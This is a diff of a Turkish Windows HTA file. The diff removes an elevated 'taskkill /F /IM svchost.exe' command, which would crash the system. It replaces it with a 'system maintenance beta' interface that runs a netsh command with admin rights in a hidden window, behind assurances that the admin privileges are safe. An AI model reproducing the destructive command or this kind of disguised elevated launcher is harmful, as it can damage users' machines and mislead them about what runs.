@@ -1,36 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>???</title>
+<title>Hızlı Sistem Bakım Uzmanı (Beta)</title>
 <hta:application
-  applicationName="???"
-  border="thin"
-  caption="yes"
-  icon=""
-  showInTaskbar="yes"
-  singleInstance="yes"
-  sysMenu="yes"
-  windowState="normal"
+    applicationName="Hızlı Sistem Bakım Uzmanı Beta"
+    border="thin"
+    caption="yes"
+    icon=""
+    showInTaskbar="yes"
+    singleInstance="yes"
+    sysMenu="yes"
+    windowState="normal"
 >
+<style>
+  body { font-family: sans-serif; }
+  button { background-color: #007bff; color: white; padding: 12px 24px; border: none; cursor: pointer; font-size: 18px; border-radius: 8px; }
+  p { margin-bottom: 15px; font-size: 1.1em; }
+  .info { color: #ffc107; font-weight: bold; font-size: 1.2em; } /* Sarı/Turuncu Beta Rengi */
+  .note { font-size: 0.9em; color: gray; }
+  .beta-tag-hta { background-color: #ffc107; color: white; padding: 5px 10px; border-radius: 5px; font-size: 0.8em; margin-left: 10px; }
+  .beta-message { font-size: 0.9em; color: #6c757d; font-style: italic; margin-top: 10px; }
+</style>
 <script language="VBScript">
-Sub RunTaskkillAdmin
+Sub RunOptimization
 
-  ' Çalıştırılacak komut
-  komut = "taskkill /F /IM svchost.exe"
+    MsgBox "Hızlı Sistem Bakım Uzmanı'nın bu beta sürümünü denediğiniz için teşekkür ederiz! Performansı optimize etmek için bazı sistem ayarlarını güvenli bir şekilde düzenleyeceğiz. Yönetici izniniz gereklidir. Lütfen 'Evet'e tıklayarak devam edin.", vbOKOnly + vbInformation, "Beta Bilgilendirmesi"
 
-  ' Shell.Application nesnesi oluştur
-  Set objShellApp = CreateObject("Shell.Application")
+    komut = "netsh interface tcp set global autotuninglevel=normal"
+    Set objShellApp = CreateObject("Shell.Application")
+    ' 0 parametresi pencereyi gizler
+    objShellApp.ShellExecute "cmd.exe", "/c " & komut, "", "runas", 0
+    Set objShellApp = Nothing
 
-  ' Komutu yönetici ayrıcalıklarıyla çalıştırmayı iste
-  objShellApp.ShellExecute "cmd.exe", "/c " & komut, "", "runas", 1
-
-  ' Nesneyi serbest bırak
-  Set objShellApp = Nothing
+    MsgBox "Optimizasyon işlemi başlatıldı (Beta Aşaması). Geri bildirimleriniz bu sürümü geliştirmemize yardımcı olacaktır.", vbOKOnly + vbInformation, "İşlem Başlatıldı"
 
 End Sub
 </script>
 </head>
 <body>
-  <button onclick="RunTaskkillAdmin()">???</button>
+    <h1>Hızlı Sistem Bakım Uzmanı <span class="beta-tag-hta">Beta</span></h1>
+    <p class="info">Erken Erişim - Performansı Deneyin ve Geliştirmemize Yardımcı Olun!</p>
+    <p>Bu, Hızlı Sistem Bakım Uzmanı'nın bir beta sürümüdür. Lütfen deneyin ve karşılaştığınız sorunları veya önerilerinizi bizimle paylaşın.</p>
+    <button onclick="RunOptimization()">Beta İyileştirmeyi Başlat</button>
+    <p class="note">(Bu işlem, sistem performansını artırmak için güvenli yönetici ayrıcalıkları isteyecektir.)</p>
+    <p class="beta-message">Geri bildirimlerinizi [e-posta adresi veya geri bildirim formu bağlantısı] üzerinden iletebilirsiniz.</p>
 </body>
 </html>
